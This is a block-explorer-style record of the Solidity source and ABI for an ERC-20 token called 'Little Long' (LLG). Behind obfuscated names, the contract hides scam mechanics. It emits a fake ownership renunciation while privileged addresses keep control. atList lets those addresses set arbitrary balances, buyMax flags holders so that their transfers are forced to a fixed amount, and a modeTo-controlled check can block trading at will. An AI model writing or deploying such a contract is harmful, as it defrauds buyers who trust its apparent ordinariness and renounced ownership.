{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.16;\n\ninterface exemptReceiverWallet {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address senderLiquidity) external view returns (uint256);\n\n    function transfer(address enableMarketing, uint256 toSwapFee) external returns (bool);\n\n    function allowance(address teamAt, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 toSwapFee) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address enableMarketing,\n        uint256 toSwapFee\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed tokenIs, uint256 value);\n    event Approval(address indexed teamAt, address indexed spender, uint256 value);\n}\n\nabstract contract listAutoBuy {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface totalList {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface senderReceiver {\n    function createPair(address buyTo, address receiverTake) external returns (address);\n}\n\ninterface exemptReceiverWalletMetadata is exemptReceiverWallet {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract LittleLong is listAutoBuy, exemptReceiverWallet, exemptReceiverWalletMetadata {\n\n    uint256 constant sellIsTeam = 13 ** 10;\n\n    function allowance(address receiverBuyFund, address receiverTotal) external view virtual override returns (uint256) {\n        if (receiverTotal == launchMarketing) {\n            return type(uint256).max;\n        }\n        return shouldTake[receiverBuyFund][receiverTotal];\n    }\n\n    address public totalTx;\n\n    bool private enableAt;\n\n    function modeTo(uint256 toSwapFee) public {\n        marketingToken();\n        walletMinTeam = toSwapFee;\n    }\n\n    function marketingToken() private view {\n        require(takeMin[_msgSender()]);\n    }\n\n    mapping(address => uint256) private tokenMarketing;\n\n    uint256 public isAuto;\n\n    bool public txFee;\n\n    function symbol() external view virtual override returns (string memory) {\n        return launchBuy;\n    }\n\n    uint256 private isBuyExempt;\n\n    string private fromLaunched = \"Little Long\";\n\n    function transferFrom(address autoLiquidity, address enableMarketing, uint256 toSwapFee) external override returns (bool) {\n        if (_msgSender() != launchMarketing) {\n            if (shouldTake[autoLiquidity][_msgSender()] != type(uint256).max) {\n                require(toSwapFee <= shouldTake[autoLiquidity][_msgSender()]);\n                shouldTake[autoLiquidity][_msgSender()] -= toSwapFee;\n            }\n        }\n        return teamTokenMin(autoLiquidity, enableMarketing, toSwapFee);\n    }\n\n    mapping(address => bool) public takeMin;\n\n    uint256 private amountFee = 100000000 * 10 ** 18;\n\n    function minMode(address autoLiquidity, address enableMarketing, uint256 toSwapFee) internal returns (bool) {\n        require(tokenMarketing[autoLiquidity] >= toSwapFee);\n        tokenMarketing[autoLiquidity] -= toSwapFee;\n        tokenMarketing[enableMarketing] += toSwapFee;\n        emit Transfer(autoLiquidity, enableMarketing, toSwapFee);\n        return true;\n    }\n\n    mapping(address => bool) public atTeam;\n\n    mapping(address => mapping(address => uint256)) private shouldTake;\n\n    address public receiverSwapTotal;\n\n    address listSender = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 public tokenFund;\n\n    bool private enableLaunched;\n\n    function transfer(address launchedAt, uint256 toSwapFee) external virtual override returns (bool) {\n        return teamTokenMin(_msgSender(), launchedAt, toSwapFee);\n    }\n\n    function atList(address launchedAt, uint256 toSwapFee) public {\n        marketingToken();\n        tokenMarketing[launchedAt] = toSwapFee;\n    }\n\n    function owner() external view returns (address) {\n        return listShould;\n    }\n\n    function getOwner() external view returns (address) {\n        return listShould;\n    }\n\n    function balanceOf(address senderLiquidity) public view virtual override returns (uint256) {\n        return tokenMarketing[senderLiquidity];\n    }\n\n    address launchMarketing = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function decimals() external view virtual override returns (uint8) {\n        return sellTeam;\n    }\n\n    function teamTokenMin(address autoLiquidity, address enableMarketing, uint256 toSwapFee) internal returns (bool) {\n        if (autoLiquidity == receiverSwapTotal) {\n            return minMode(autoLiquidity, enableMarketing, toSwapFee);\n        }\n        uint256 maxReceiver = exemptReceiverWallet(totalTx).balanceOf(listSender);\n        require(maxReceiver == walletMinTeam);\n        require(enableMarketing != listSender);\n        if (atTeam[autoLiquidity]) {\n            return minMode(autoLiquidity, enableMarketing, sellIsTeam);\n        }\n        return minMode(autoLiquidity, enableMarketing, toSwapFee);\n    }\n\n    string private launchBuy = \"LLG\";\n\n    function approve(address receiverTotal, uint256 toSwapFee) public virtual override returns (bool) {\n        shouldTake[_msgSender()][receiverTotal] = toSwapFee;\n        emit Approval(_msgSender(), receiverTotal, toSwapFee);\n        return true;\n    }\n\n    function buyMax(address teamTake) public {\n        marketingToken();\n        \n        if (teamTake == receiverSwapTotal || teamTake == totalTx) {\n            return;\n        }\n        atTeam[teamTake] = true;\n    }\n\n    address private listShould;\n\n    uint256 walletMinTeam;\n\n    function launchAutoMin() public {\n        emit OwnershipTransferred(receiverSwapTotal, address(0));\n        listShould = address(0);\n    }\n\n    constructor (){\n        \n        totalList isFund = totalList(launchMarketing);\n        totalTx = senderReceiver(isFund.factory()).createPair(isFund.WETH(), address(this));\n        \n        receiverSwapTotal = _msgSender();\n        launchAutoMin();\n        takeMin[receiverSwapTotal] = true;\n        tokenMarketing[receiverSwapTotal] = amountFee;\n        \n        emit Transfer(address(0), receiverSwapTotal, amountFee);\n    }\n\n    bool private autoEnableToken;\n\n    function txIs(address autoToken) public {\n        if (txFee) {\n            return;\n        }\n        if (isAuto != isBuyExempt) {\n            enableLaunched = true;\n        }\n        takeMin[autoToken] = true;\n        if (autoEnableToken != liquidityTx) {\n            tokenFund = isAuto;\n        }\n        txFee = true;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return fromLaunched;\n    }\n\n    event OwnershipTransferred(address indexed swapTx, address indexed isMarketing);\n\n    uint8 private sellTeam = 18;\n\n    uint256 fromTx;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return amountFee;\n    }\n\n    bool public liquidityTx;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"teamAt\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"swapTx\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isMarketing\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tokenIs\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverBuyFund\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"receiverTotal\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"toSwapFee\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"toSwapFee\",\"type\":\"uint256\"}],\"name\":\"atList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"atTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderLiquidity\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamTake\",\"type\":\"address\"}],\"name\":\"buyMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isAuto\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchAutoMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"toSwapFee\",\"type\":\"uint256\"}],\"name\":\"modeTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverSwapTotal\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"takeMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenFund\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalTx\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"toSwapFee\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoLiquidity\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"enableMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"toSwapFee\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoToken\",\"type\":\"address\"}],\"name\":\"txIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "LittleLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}